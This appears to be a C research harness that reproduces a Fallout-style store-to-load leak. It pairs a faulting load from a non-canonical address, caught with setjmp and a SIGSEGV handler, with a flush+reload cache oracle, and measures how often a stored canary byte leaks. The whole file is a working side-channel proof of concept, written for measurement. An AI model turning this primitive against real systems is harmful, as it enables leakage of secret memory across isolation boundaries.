/*
 * ref-mirror: the FalloutV1 -O0 loop, scored on this machine's oracle.
 *
 * The lab disassembly of attack-base does: load the byte, store it to the
 * victim page, setjmp, then movzx from non-canonical 0x9876543214321000 plus
 * the same page offset, scale, and touch the oracle. The SIGSEGV handler
 * longjmps, so that oracle touch does not retire. This file keeps that
 * shape and changes only the oracle stride, from 4096 to 0x1040.
 *
 * Offset 70 is their i*10 for i=7. That line is L1 set 1. Canary 0x42 is
 * class 2, set 2. Class 0 is set 0. One execution flushes both slots, runs
 * one attempt, then reloads class 2 and class 0. That is one event, not two
 * gadget runs.
 *
 * Compiled -O0. Hit: reload < 150. A round is 64 executions. A majority
 * round has hits * 2 > 64. Repeatable in one process means
 * majority_rounds * 2 > ROUNDS (default 8). Either sentence needs two
 * processes.
 *
 * SURVIVES, only if both runs have class 2 repeatable on store, not
 * repeatable on nostore, and class 0 not repeatable on store: in this
 * setjmp sequence the signal is consistent with class 2 after the faulting
 * load, the store is required for that rate, and class 0 is not the
 * repeating hit. Class 2 matches every byte congruent to 2 (mod 64):
 * 0x02, 0x42, 0x82, 0xC2. No origin claim.
 *
 * ABSENT, only if both runs have class 2 not repeatable on store: in this
 * setjmp sequence class 2 is not repeatable on the store arm.
 *
 * This process prints rates only.
 */

#define _GNU_SOURCE

#include <errno.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define SLOT_SIZE  0x1040
#define HOT_CYCLES 150
#define OFFSET     70
#define CANARY     0x42
#define CLS_CANARY (CANARY & 0x3f) /* 2 */
#define CLS_ZERO   0
#define NC_BASE    0x9876543214321000ull
#define TRIALS     64

static char __attribute__((aligned(0x1000))) oracle_lo[SLOT_SIZE * 256];
static uint8_t *victim;
static jmp_buf trycatch_buf;
static int rounds = 8;

static void unblock(int sig)
{
    sigset_t set;

    sigemptyset(&set);
    sigaddset(&set, sig);
    sigaddset(&set, SIGFPE);
    sigprocmask(SIG_UNBLOCK, &set, NULL);
}

static void handler(int sig)
{
    unblock(sig);
    longjmp(trycatch_buf, 1);
}

static void maccess(void *p)
{
    asm volatile("movq (%0), %%rax\n" :: "c"(p) : "rax");
}

static void flush_line(void *p)
{
    asm volatile("clflush (%0)\n\tmfence\n\tlfence\n" :: "r"(p) : "memory");
}

static uint64_t reload_time(void *p)
{
    unsigned lo, hi;
    uint64_t a, b;

    asm volatile("mfence\n\tlfence\n\trdtsc" : "=a"(lo), "=d"(hi) :: "memory");
    a = ((uint64_t)hi << 32) | lo;
    asm volatile("mov (%0), %%eax" :: "r"(p) : "eax", "memory");
    asm volatile("lfence\n\trdtsc" : "=a"(lo), "=d"(hi) :: "memory");
    b = ((uint64_t)hi << 32) | lo;
    return b - a;
}

/* Their loop, one byte. The store is absent when do_store is 0. */
static void attempt(int do_store)
{
    unsigned char *attacker = (unsigned char *)NC_BASE;

    if (do_store)
        victim[OFFSET] = CANARY;
    if (!setjmp(trycatch_buf))
        maccess(oracle_lo + (size_t)SLOT_SIZE * attacker[OFFSET]);
}

/* One attempt, then both slots. Hits are from the same executions. */
static void measure(int do_store, int *hits_c, int *hits_z)
{
    char *slot_c = oracle_lo + (size_t)SLOT_SIZE * CLS_CANARY;
    char *slot_z = oracle_lo + (size_t)SLOT_SIZE * CLS_ZERO;
    int i;

    *hits_c = 0;
    *hits_z = 0;
    for (i = 0; i < TRIALS; i++) {
        uint64_t tc, tz;

        flush_line(slot_c);
        flush_line(slot_z);
        attempt(do_store);
        tc = reload_time(slot_c);
        tz = reload_time(slot_z);
        if (tc < HOT_CYCLES)
            (*hits_c)++;
        if (tz < HOT_CYCLES)
            (*hits_z)++;
    }
}

static uint8_t *mmap_anon(void)
{
    uint8_t *p = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (p == MAP_FAILED) {
        fprintf(stderr, "mmap: %s\n", strerror(errno));
        return NULL;
    }
    return p;
}

static int pin_cpu(void)
{
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(1, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) {
        fprintf(stderr, "sched_setaffinity: %s\n", strerror(errno));
        return -1;
    }
    return sched_getcpu() == 1 ? 0 : -1;
}

int main(void)
{
    struct sigaction sa;
    const char *s;
    char *end;
    long v;
    int arm, rnd;

    setvbuf(stdout, NULL, _IOLBF, 0);
    s = getenv("ROUNDS");
    if (s && *s) {
        v = strtol(s, &end, 0);
        if (*end || v < 1 || v > 64) {
            fprintf(stderr, "ROUNDS must be 1..64\n");
            return 2;
        }
        rounds = (int)v;
    }
    if (pin_cpu() != 0)
        return 2;

    victim = mmap_anon();
    if (victim == NULL)
        return 2;
    /* Fault the page in at offset 0, set 0, then drain it. Offset 70 stays
     * unwritten until the store arm. */
    victim[0] = 0;
    asm volatile("mfence" ::: "memory");

    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = handler;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGSEGV, &sa, NULL) != 0) {
        fprintf(stderr, "sigaction: %s\n", strerror(errno));
        return 2;
    }

    printf("ref-mirror: cpu=1 canary=0x%02x class=%d offset=%d set=%d "
           "trials=%d rounds=%d hot<%d fault=nc-gp gate=setjmp\n",
           CANARY, CLS_CANARY, OFFSET, OFFSET >> 6, TRIALS, rounds, HOT_CYCLES);
    printf("rule: one attempt times class %d and class 0; majority=hits*2>%d; "
           "repeatable=majority_rounds*2>rounds. Two processes. "
           "Class %d is v%%64==2. No origin claim.\n",
           CLS_CANARY, TRIALS, CLS_CANARY);

    for (arm = 0; arm < 2; arm++) {
        int maj_c = 0, maj_z = 0;
        const char *name = arm ? "store" : "nostore";

        for (rnd = 0; rnd < rounds; rnd++) {
            int hc, hz, mc, mz;

            measure(arm, &hc, &hz);
            mc = hc * 2 > TRIALS;
            mz = hz * 2 > TRIALS;

            if (mc)
                maj_c++;
            if (mz)
                maj_z++;
            printf("mirror arm=%s round=%d c%d=%d/%d majority=%d c0=%d/%d majority=%d\n",
                   name, rnd, CLS_CANARY, hc, TRIALS, mc, hz, TRIALS, mz);
        }
        printf("mirror arm=%s class%d_rounds=%d/%d repeatable=%d "
               "class0_rounds=%d/%d repeatable=%d\n",
               name, CLS_CANARY, maj_c, rounds, maj_c * 2 > rounds,
               maj_z, rounds, maj_z * 2 > rounds);
    }
    printf("mirror_result: rates only, two-run rule is outside this process\n");
    return 0;
}
